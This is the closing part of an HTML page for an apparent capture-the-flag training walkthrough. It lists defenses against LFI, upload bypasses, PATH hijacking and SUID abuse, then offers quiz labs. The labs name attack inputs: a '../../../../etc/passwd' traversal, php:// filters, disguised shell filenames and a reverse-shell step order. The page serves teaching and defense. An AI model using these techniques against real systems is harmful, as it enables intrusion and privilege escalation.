+<p>No single vulnerability caused the compromise. LFI alone is dangerous. Credential reuse alone is dangerous. SUID misconfiguration alone is dangerous. But chained together in sequence, they create a path from anonymous remote access to full root compromise. This is how real-world attacks work — not through a single zero-day, but through a cascade of small failures.</p>
+</div>
+</div>
+</section>
+
+<!-- SECTION 22: BLUE TEAM DEFENSE -->
+<section class="section" id="defense">
+<div class="container">
+<div class="section-title">
+<div class="label" style="margin-bottom:8px">Blue Team</div>
+<h2>Defensive Measures</h2>
+<p>Every vulnerability in this walkthrough has a corresponding defense. Understanding how to break systems is incomplete without knowing how to protect them.</p>
+</div>
+
+<div class="defense-grid">
+<div class="defense-card">
+<div class="def-title">LFI Prevention</div>
+<h4>Whitelist Inclusion</h4>
+<p>Never use user input directly in include()/require(). Maintain a whitelist of allowed file names and map user input to the whitelist. Disable PHP stream wrappers if not needed.</p>
+</div>
+<div class="defense-card">
+<div class="def-title">PHP Filter Mitigation</div>
+<h4>Disable Unused Streams</h4>
+<p>Set <code>allow_url_fopen = Off</code> and restrict <code>php://</code> filters. Use <code>allow_url_include = Off</code> in php.ini. Audit all file operations for user-controlled input.</p>
+</div>
+<div class="defense-card">
+<div class="def-title">Credential Storage</div>
+<h4>Strong Password Hashing</h4>
+<p>Use bcrypt (cost factor 12+), Argon2id, or PBKDF2. Never store passwords as Base64, MD5, or SHA1. Enforce password complexity and rotate credentials regularly.</p>
+</div>
+<div class="defense-card">
+<div class="def-title">Secure Uploads</div>
+<h4>Defense in Depth</h4>
+<p>Validate MIME type AND magic bytes. Store uploads outside webroot. Disable PHP execution in upload directories. Use randomized filenames. Scan for malware.</p>
+</div>
+<div class="defense-card">
+<div class="def-title">Least Privilege</div>
+<h4>Restrict Web Server User</h4>
+<p>Run Apache/Nginx as a dedicated low-privilege user. Restrict file system access. Do not allow www-data to read sensitive files like config.php or /etc/shadow.</p>
+</div>
+<div class="defense-card">
+<div class="def-title">PATH Security</div>
+<h4>Always Use Absolute Paths</h4>
+<p>In scripts and binaries, always use absolute paths (<code>/bin/cat</code> not <code>cat</code>). Never inherit or trust the user's PATH environment variable. Sanitize PATH in scripts.</p>
+</div>
+<div class="defense-card">
+<div class="def-title">SUID Restrictions</div>
+<h4>Minimize SUID Binaries</h4>
+<p>Audit all SUID binaries regularly. Remove SUID from unnecessary files. Never use system() or popen() in SUID binaries. Use capabilities instead of SUID where possible.</p>
+</div>
+<div class="defense-card">
+<div class="def-title">Command Injection</div>
+<h4>Never Pass User Input to Shell</h4>
+<p>Avoid system(), exec(), passthru(), shell_exec() with user input. Use escapeshellarg()/escapeshellcmd() if shell execution is unavoidable. Prefer safer APIs.</p>
+</div>
+</div>
+
+<div style="margin-top:32px;padding:24px;border-radius:12px;border:1px solid var(--border);background:var(--card)">
+<h3>Defensive Security Summary</h3>
+<table class="impact-table">
+<tr><th>Layer</th><th>Fix</th></tr>
+<tr><td>Web Application</td><td>Input validation, whitelist includes</td></tr>
+<tr><td>File Upload</td><td>MIME validation, store outside webroot</td></tr>
+<tr><td>Database</td><td>Strong hashing, least privilege, firewalls</td></tr>
+<tr><td>Operating System</td><td>No SUID misuse, absolute paths in scripts</td></tr>
+<tr><td>Administrative</td><td>Regular audits, principle of least privilege</td></tr>
+</table>
+</div>
+</div>
+</section>
+
+<!-- SECTION 23: INTERACTIVE LABS -->
+<section class="section section-dark" id="labs">
+<div class="container">
+<div class="section-title">
+<div class="label" style="margin-bottom:8px">Practice</div>
+<h2>Interactive Practice Labs</h2>
+<p>Educational simulations to practice the techniques covered in this walkthrough. Understanding comes from hands-on experimentation.</p>
+</div>
+
+<div class="card-grid">
+
+<div class="lab-card">
+<h4>Directory Enumeration Lab</h4>
+<p>Practice identifying hidden directories. Given a web root, determine which paths are likely to exist.</p>
+<div>
+<input class="lab-input" id="dirLabInput" placeholder="Type a directory name (e.g., config)" onkeydown="if(event.key==='Enter')checkDirectory()"/>
+<button class="btn" style="padding:8px 16px;font-size:.8rem" onclick="checkDirectory()">Check</button>
+</div>
+<div class="lab-output" id="dirLabOutput">Enter a directory name to check if it exists.</div>
+</div>
+
+<div class="lab-card">
+<h4>Base64 Decoder Lab</h4>
+<p>Practice decoding Base64 strings. Real attackers encounter encoded credentials constantly.</p>
+<div>
+<input class="lab-input" id="b64LabInput" placeholder="Paste Base64 string here"/>
+<button class="btn" style="padding:8px 16px;font-size:.8rem" onclick="decodeBase64()">Decode</button>
+</div>
+<div class="lab-output" id="b64LabOutput">Decoded text will appear here.</div>
+</div>
+
+<div class="lab-card">
+<h4>LFI Path Testing</h4>
+<p>Understand how path traversal works. Test different LFI patterns against a simulated include function.</p>
+<div>
+<input class="lab-input" id="lfiLabInput" placeholder="e.g., ../../../../etc/passwd"/>
+<button class="btn" style="padding:8px 16px;font-size:.8rem" onclick="testLFI()">Test</button>
+</div>
+<div class="lab-output" id="lfiLabOutput">Enter a path to test inclusion behavior.</div>
+</div>
+
+<div class="lab-card">
+<h4>Reverse Shell Workflow</h4>
+<p>Drag the steps to reconstruct the correct reverse shell workflow.</p>
+<p style="font-size:.8rem;color:var(--text2);margin-bottom:12px">Click the steps in the correct order:</p>
+<div style="display:flex;flex-wrap:wrap;gap:8px" id="revShellSteps">
+<div style="padding:8px 14px;border-radius:6px;border:1px solid var(--border);font-size:.75rem;cursor:pointer;background:var(--bg3);color:var(--text2)" onclick="stepClick(this,'Start listener')">Start nc listener</div>
+<div style="padding:8px 14px;border-radius:6px;border:1px solid var(--border);font-size:.75rem;cursor:pointer;background:var(--bg3);color:var(--text2)" onclick="stepClick(this,'Send payload')">Send bash payload</div>
+<div style="padding:8px 14px;border-radius:6px;border:1px solid var(--border);font-size:.75rem;cursor:pointer;background:var(--bg3);color:var(--text2)" onclick="stepClick(this,'Upload shell')">Upload web shell</div>
+<div style="padding:8px 14px;border-radius:6px;border:1px solid var(--border);font-size:.75rem;cursor:pointer;background:var(--bg3);color:var(--text2)" onclick="stepClick(this,'Get interactive')">Get interactive shell</div>
+<div style="padding:8px 14px;border-radius:6px;border:1px solid var(--border);font-size:.75rem;cursor:pointer;background:var(--bg3);color:var(--text2)" onclick="stepClick(this,'Privilege Esc')">Escalate privileges</div>
+</div>
+<div class="lab-output" id="revShellOut" style="margin-top:12px">Click steps to build the correct chain.</div>
+</div>
+
+<div class="lab-card">
+<h4>Upload Bypass Understanding</h4>
+<p>Which of these filenames would bypass a basic extension-only filter that blocks .php?</p>
+<div style="display:flex;flex-wrap:wrap;gap:8px">
+<div style="padding:8px 14px;border-radius:6px;border:1px solid var(--border);font-size:.75rem;cursor:pointer;background:var(--bg3);color:var(--text2)" onclick="checkUploadBypass(this,'shell.php')">shell.php</div>
+<div style="padding:8px 14px;border-radius:6px;border:1px solid var(--border);font-size:.75rem;cursor:pointer;background:var(--bg3);color:var(--text2)" onclick="checkUploadBypass(this,'shell.php.gif')">shell.php.gif</div>
+<div style="padding:8px 14px;border-radius:6px;border:1px solid var(--border);font-size:.75rem;cursor:pointer;background:var(--bg3);color:var(--text2)" onclick="checkUploadBypass(this,'shell.jpg')">shell.jpg</div>
+<div style="padding:8px 14px;border-radius:6px;border:1px solid var(--border);font-size:.75rem;cursor:pointer;background:var(--bg3);color:var(--text2)" onclick="checkUploadBypass(this,'shell.phtml')">shell.phtml</div>
+</div>
+<div class="lab-output" id="uploadLabOut" style="margin-top:12px">Click a filename to check if it bypasses.</div>
+</div>
+
+<div class="lab-card">
+<h4>PATH Hijacking Logic</h4>
+<p>If PATH=<code>/tmp:/usr/bin:/bin</code> and a program calls <code>cat</code>, which directory is searched first?</p>
+<div style="display:flex;flex-wrap:wrap;gap:8px">
+<div style="padding:8px 14px;border-radius:6px;border:1px solid var(--border);font-size:.75rem;cursor:pointer;background:var(--bg3);color:var(--text2)" onclick="checkPathLab(this,'/usr/bin')">/usr/bin</div>
+<div style="padding:8px 14px;border-radius:6px;border:1px solid var(--border);font-size:.75rem;cursor:pointer;background:var(--bg3);color:var(--text2)" onclick="checkPathLab(this,'/bin')">/bin</div>
+<div style="padding:8px 14px;border-radius:6px;border:1px solid var(--border);font-size:.75rem;cursor:pointer;background:var(--bg3);color:var(--text2)" onclick="checkPathLab(this,'/tmp')">/tmp</div>
+</div>
+<div class="lab-output" id="pathLabOut" style="margin-top:12px">Click a directory to check.</div>
+</div>
+
+</div>
+</div>
+</section>
+
+<!-- SECTION 24: FINAL MINDSET -->
+<section class="section" style="padding:80px 0;border-top:1px solid var(--border)">
+<div class="container">
+<div class="section-title">
+<div class="label" style="margin-bottom:8px">Conclusion</div>
+<h2>Final Pentester Mindset</h2>
+<p>This walkthrough taught techniques. But the real lesson is how to <em>think</em> like an attacker.</p>
+</div>
+
+<div class="highlight-box" style="text-align:center;max-width:800px;margin:0 auto 40px;padding:36px">
+<h4 style="font-size:1.3rem;color:var(--green)">"No single vulnerability caused the compromise. The real danger came from chaining small weaknesses together."</h4>
+<p style="margin-top:12px;color:var(--text2)">LFI alone is a vulnerability. Credential reuse is a vulnerability. SUID misconfiguration is a vulnerability. But when an attacker chains them — directory bruteforce → LFI → PHP filter → credential leak → database access → upload bypass → RCE → reverse shell → user pivot → PATH hijack → SUID abuse → root — each weakness amplifies the next. The result is total compromise.</p>
+</div>
+
+<div class="mindset-grid">
+<div class="mindset-card">
+<div class="num">01</div>
+<h4>Think Like an Attacker</h4>
+<p>Every feature is a potential vulnerability. Every parameter is an attack vector. Question everything.</p>
+</div>
+<div class="mindset-card">
+<div class="num">02</div>
+<h4>Enumerate Relentlessly</h4>
+<p>Attackers don't guess — they discover. Directory bruteforcing, port scanning, parameter fuzzing — information is power.</p>
+</div>
+<div class="mindset-card">
+<div class="num">03</div>
+<h4>Chain Vulnerabilities</h4>
+<p>No single bug wins. The attack chain is what matters. Think in sequences, not single exploits.</p>
+</div>
+<div class="mindset-card">
+<div class="num">04</div>
+<h4>Understand Impact</h4>
+<p>Low-severity issues become critical when chained. Understand the business impact of every finding.</p>
+</div>
+<div class="mindset-card">
+<div class="num">05</div>
+<h4>Think Beyond Tools</h4>
+<p>Tools find low-hanging fruit. Methodology finds root access. Understand the logic, not just the syntax.</p>
+</div>
+<div class="mindset-card">
+<div class="num">06</div>
+<h4>Defenders Must Chain Too</h4>
+<p>Attackers chain vulnerabilities — defenders must chain defenses. One fix is never enough. Defense in depth is the only answer.</p>
+</div>
+</div>
+
+<div style="text-align:center;margin-top:60px;padding:40px;border-radius:16px;border:1px solid var(--border);background:var(--card)">
+<div style="font-family:'Orbitron',sans-serif;font-size:2rem;color:var(--green);margin-bottom:8px">Same Logic. Every Engagement.</div>
+<p style="color:var(--text2);font-size:1rem;max-width:600px;margin:0 auto">The techniques used here appear in bug bounty programs, red team engagements, OSCP/PNPT exams, and real corporate pentests. You didn't just hack a machine — you learned how attackers think, how defenders fail, and how small mistakes destroy security.</p>
+</div>
+</div>
+</section>
+
+<!-- FOOTER -->
+<footer class="footer">
+<div class="container">
+<div style="font-family:'Orbitron',sans-serif;color:var(--green);font-weight:700;font-size:1.2rem;margin-bottom:8px">PwnLab.init</div>
+<p>Offensive Security Training — From Web Application Exploitation to Full Root Compromise</p>
+<p style="margin-top:12px">Designed for educational purposes. Practice responsibly on authorized targets only.</p>
+</div>
+</footer>
+
+<script>
+// Hero Terminal Animation
+(function(){
+  const logLines = [
+    {text: 'Reconnaissance Started', status: 'done'},
+    {text: 'Web Server Detected — Apache 2.4.29', status: 'done'},
+    {text: 'LFI Vulnerability Found', status: 'done'},
+    {text: 'Credentials Extracted — Base64 Decoded', status: 'done'},
+    {text: 'Database Compromised', status: 'done'},
+    {text: 'Upload Bypass Successful', status: 'done'},
+    {text: 'Reverse Shell Established', status: 'progress'},
+    {text: 'User Pivot: www-data → kent', status: ''},
+    {text: 'PATH Hijacking: kane → mike', status: ''},
+    {text: 'SUID Exploitation Initiated', status: ''},
+    {text: 'Root Access Achieved', status: ''},
+  ];
+  const el = document.getElementById('heroLogs');
+  if(!el) return;
+  const statusMap = {done:'✔',progress:'⟳',fail:'✘'};
+  let i = 0;
+  function addLog(){
+    if(i >= logLines.length) return;
+    const line = logLines[i];
+    const div = document.createElement('div');
+    div.className = 'log-line';
+    const time = new Date().toLocaleTimeString();
+    const statusChar = statusMap[line.status] || '○';
+    div.innerHTML = `<span class="log-time">[${time}]</span><span class="log-status ${line.status}">${statusChar}</span> ${line.text}`;
+    el.appendChild(div);
+    i++;
+    setTimeout(addLog, i <= 3 ? 400 : 800);
+  }
+  addLog();
+})();
+
+// Reverse Shell Animation
+(function(){
+  const packet = document.getElementById('animPacket');
+  const pulse = document.getElementById('animPulse');
+  if(packet){
+    setInterval(() => {
+      packet.style.animation = 'none';
+      packet.offsetHeight;
+      packet.style.animation = 'fly 3s linear infinite';
+    }, 5000);
+  }
+})();
+
+// Interactive Labs
+function checkDirectory() {
+  const input = document.getElementById('dirLabInput');
+  const out = document.getElementById('dirLabOutput');
+  if(!input||!out)return;
+  const val = input.value.trim().toLowerCase();
+  const real = ['config','admin','upload','backup','login','include','css','js','images','api','test','dev','logs','data','secret'];
+  if(real.includes(val)){
+    out.innerHTML = `<span style="color:var(--green)">✔ Found:</span> /${val} — This directory exists! Attackers would investigate this.`;
+  } else {
+    out.innerHTML = `<span style="color:var(--text3)">✘ Not found:</span> /${val} returned 404. Try: config, admin, upload, backup, include`;
+  }
+}
+
+function decodeBase64() {
+  const input = document.getElementById('b64LabInput');
+  const out = document.getElementById('b64LabOutput');
+  if(!input||!out)return;
+  const val = input.value.trim();
+  if(!val){out.innerHTML='Please enter a Base64 string.';return;}
+  try{
+    const dec = atob(val);
+    out.innerHTML = `<span style="color:var(--green)">Decoded:</span> ${dec}`;
+  } catch(e) {
+    out.innerHTML = `<span style="color:var(--red)">Error:</span> Invalid Base64 encoding. Try pasting a real Base64 string.`;
+  }
+}
+
+function testLFI() {
+  const input = document.getElementById('lfiLabInput');
+  const out = document.getElementById('lfiLabOutput');
+  if(!input||!out)return;
+  const val = input.value.trim();
+  if(!val){out.innerHTML='Enter a path to test.';return;}
+  if(val.includes('../../') || val.includes('..\\')){
+    out.innerHTML = `<span style="color:var(--green)">✔ Path traversal detected!</span> The server would attempt to read: ${val}<br/><span style="color:var(--text2)">In a real LFI, this could expose /etc/passwd or config files.</span>`;
+  } else if(val.includes('php://')){
+    out.innerHTML = `<span style="color:var(--green)">✔ PHP filter bypass!</span> Using php://filter would encode the file content and bypass execution restrictions.`;
+  } else {
+    out.innerHTML = `<span style="color:var(--text2)">Testing:</span> ${val}<br/><span style="color:var(--text3)">Try path traversal like ../../../../etc/passwd or php:// wrappers.</span>`;
+  }
+}
+
+const revOrder = [];
+function stepClick(el, name) {
+  const out = document.getElementById('revShellOut');
+  if(el.style.background === 'rgba(0, 255, 136, 0.15)' || el.style.borderColor){
+    el.style.background = 'var(--bg3)';
+    el.style.borderColor = 'var(--border)';
+    el.style.color = 'var(--text2)';
+    const idx = revOrder.indexOf(name);
+    if(idx>-1)revOrder.splice(idx,1);
+  } else {
+    el.style.background = 'rgba(0,255,136,0.15)';
+    el.style.borderColor = 'var(--green)';
+    el.style.color = 'var(--green)';
+    revOrder.push(name);
+  }
+  const correct = ['Start listener','Upload shell','Send payload','Get interactive','Privilege Esc'];
+  const correctStr = correct.join(' → ');
+  const userStr = revOrder.join(' → ');
+  if(revOrder.length === 0){
+    out.innerHTML = 'Click steps to build the correct chain.';
+  } else if(revOrder.length === correct.length && revOrder.every((v,i)=>v===correct[i])){
+    out.innerHTML = `<span style="color:var(--green)">✔ Correct!</span> The workflow: ${correctStr}<br/><span style="color:var(--text2)">You understand the reverse shell process.</span>`;
+  } else {
+    out.innerHTML = `Your chain: <span style="color:var(--yellow)">${userStr}</span><br/><span style="color:var(--text3)">Keep going — think about the sequence of operations.</span>`;
+  }
+}
+
+function checkUploadBypass(el, name) {
+  const out = document.getElementById('uploadLabOut');
+  document.querySelectorAll('#uploadLabOut').forEach(e=>{});
+  bypasses = {'shell.php.gif':true,'shell.phtml':true};
+  if(bypasses[name]){
+    out.innerHTML = `<span style="color:var(--green)">✔ Bypasses!</span> ${name} passes extension-only checks because the server sees the final extension as allowed but PHP still executes the content.`;
+    el.style.background = 'rgba(0,255,136,0.15)';
+    el.style.borderColor = 'var(--green)';
+  } else {
+    out.innerHTML = `<span style="color:var(--red)">✘ Blocked.</span> ${name} is caught by the extension filter. Try disguising the PHP payload as an allowed type.`;
+    el.style.background = 'rgba(255,51,85,0.1)';
+    el.style.borderColor = 'var(--red)';
+  }
+}
+
+function checkPathLab(el, dir) {
+  const out = document.getElementById('pathLabOut');
+  if(dir === '/tmp'){
+    out.innerHTML = `<span style="color:var(--green)">✔ Correct!</span> PATH is searched left to right. /tmp comes first, so our malicious cat in /tmp executes before the real /bin/cat.`;
+    el.style.background = 'rgba(0,255,136,0.15)';
+    el.style.borderColor = 'var(--green)';
+  } else {
+    out.innerHTML = `<span style="color:var(--red)">✘ Not first.</span> PATH=/tmp:/usr/bin:/bin — /tmp is searched first. Attackers place their malicious binary in the earliest writable directory.`;
+    el.style.background = 'rgba(255,51,85,0.1)';
+    el.style.borderColor = 'var(--red)';
+  }
+}
+</script>
+
+</body>
+</html>
